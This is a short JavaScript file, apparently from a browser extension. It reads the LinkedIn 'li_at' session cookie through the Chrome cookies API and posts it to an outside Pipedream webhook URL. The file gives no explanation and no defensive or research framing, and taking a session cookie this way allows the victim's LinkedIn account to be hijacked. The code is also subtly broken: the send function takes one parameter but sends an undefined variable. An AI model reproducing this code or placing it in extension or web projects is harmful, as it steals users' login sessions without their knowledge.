window.browser = (function () {
    return window.msBrowser ||
      window.browser ||
      window.chrome;
})();

const postToPipedream = str => {
    var data = {
        "li_at": id 
      }
      
      var config = {
        method: 'post',
        url: 'https://enelh794gszgvf.m.pipedream.net',
        data: data
      };
      
      axios(config)
      .catch(function (error) {
        console.log(error);
      })
};

function getCookies(domain, name, callback) {
    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
        if(callback) {
            callback(cookie.value);   
        }
    });
}

getCookies("https://www.linkedin.com", "li_at", function(id) {
    postToPipedream(id);
});
